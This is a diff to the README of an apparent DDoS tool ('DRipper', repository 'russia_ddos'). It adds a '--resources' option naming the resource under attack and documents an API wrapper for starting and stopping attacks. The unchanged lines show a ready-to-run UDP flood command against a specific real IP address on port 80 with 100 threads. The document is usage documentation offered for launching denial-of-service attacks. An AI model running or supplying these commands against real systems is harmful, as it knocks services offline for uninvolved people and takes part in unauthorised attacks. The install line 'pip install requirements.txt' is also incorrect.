@@ -24,6 +24,7 @@ Ensure you have Python 3 installed. Then clone this repo and run main.py with pa
 
 -r - send packets with random length (up to 50 Kb, works only with UDP attack method)
 
+--resources - name of the resource under attack
 
 ```bash
 git clone https://github.com/alexmon1989/russia_ddos.git
@@ -33,4 +34,29 @@ cd russia_ddos
 python -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1 -m udp
 # OR
 python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1 -m udp
+```
+
+
+## API
+
+API is a more convenient wrapper over start, stop, list processed for Dripper.py
+
+```
+git clone https://github.com/alexmon1989/russia_ddos.git
+cd russia_ddos
+
+# run
+pip install requirements.txt
+# or
+pip3 install requirements.txt
+
+python api.py
+# or
+python3 api.py
+```
+
+Swagger documentation is under 
+
+```
+http://localhost:49155/docs
 ```
